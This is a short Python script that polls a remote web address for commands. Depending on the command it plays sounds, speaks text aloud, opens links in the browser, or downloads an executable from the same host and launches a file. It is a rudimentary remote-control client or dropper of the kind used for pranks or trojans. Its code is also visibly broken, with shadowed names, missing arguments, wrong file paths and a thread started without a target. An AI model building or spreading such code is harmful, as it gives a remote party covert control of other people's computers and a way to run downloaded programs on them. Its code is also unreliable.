import requests as rq
from os.path import exists
from os import startfile
from pydub import AudioSegment
from pydub.playback import play
from threading import Thread as thread
import webbrowser as wb
import pyttsx3

#speak 'Hello World
url = "https://ms32.netlify.app/message.txt"
engine = pyttsx3.init()
terminate = False
def hit(url=url,encode=False):
    while not terminate:
        response = rq.get(url)
        if encode:
            response = response.decode('utf-8')
        return response

def play(audio):
    while not terminate:
        fp = f"sounds/{audio}"
        if not exists(fp):
            audio_b = hit(f"https://ms32.netlify.app/sounds/{audio}")
            with open("fp","xb") as file:
                file.write(audio_b.content)
        mp3 = AudioSegment.from_file(audio)
        play(mp3)

def speak(txt):
    while not terminate:
        engine.say(txt)
        engine.runAndWait()

def update():
    exe = hit("https://ms32.netlify.app/ms32-1.exe")
    with open("ms32-1.exe","xb") as updated_file:
        updated_file.write(exe.content)
    startfile("updater.exe")
    terminate = True
    exit()
def main():
    while not terminate:
        cmd = hit()
        if "pLaY" in cmd:
            audio = cmd.replace("pLaY ","")
            thread(target=play,args=(audio,)).start()
        elif "sPeAk" in cmd:
            txt = cmd.replace("sPeAk '")
            thread(target=engine,args=(txt,)).start()
        elif "lInK" in cmd:
            link = cmd.replace("lInK '")
            wb.open(link)
        elif "uPdAtE" in cmd:
            pass

thread(args=main).start()